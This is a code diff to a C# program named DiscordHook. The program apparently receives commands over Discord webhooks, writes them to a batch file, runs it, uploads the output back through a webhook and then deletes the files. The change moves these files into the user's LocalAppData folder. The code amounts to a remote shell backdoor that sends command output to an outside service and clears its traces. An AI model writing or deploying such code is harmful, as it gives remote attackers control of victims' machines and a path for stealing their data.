@@ -1,3 +1,4 @@
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Text;
@@ -18,7 +19,7 @@ namespace DiscordHook
             }
             else            //shell commands
             {
-                using var batfile = File.Create("shell.bat");
+                using var batfile = File.Create(@$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\shell.bat");
                 await batfile.WriteAsync(Encoding.ASCII.GetBytes(command), 0, Encoding.ASCII.GetBytes(command).Length);
                 batfile.Close();
 
@@ -28,7 +29,7 @@ namespace DiscordHook
                     {
                         UseShellExecute = false,
                         RedirectStandardOutput = true,
-                        FileName = "shell.bat"
+                        FileName = @$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\shell.bat"
                     }
                 };
                 shellproc.Start();
@@ -40,14 +41,14 @@ namespace DiscordHook
                 }
                 else
                 {
-                    using var outputfile = File.Create("output.txt");
+                    using var outputfile = File.Create(@$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\output.txt");
                     await outputfile.WriteAsync(Encoding.ASCII.GetBytes(outputstring), 0,
                         Encoding.ASCII.GetBytes(outputstring).Length);
                     outputfile.Close();
-                    await SendFileHook(replyhook, new FileInfo("output.txt"));
-                    File.Delete("output.txt");
+                    await SendFileHook(replyhook, new FileInfo(@$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\output.txt"));
+                    File.Delete(@$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\output.txt");
                 }
-                File.Delete("shell.bat");
+                File.Delete(@$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\shell.bat");
                 await SendStringHook("null", commandhook);
             }
         }
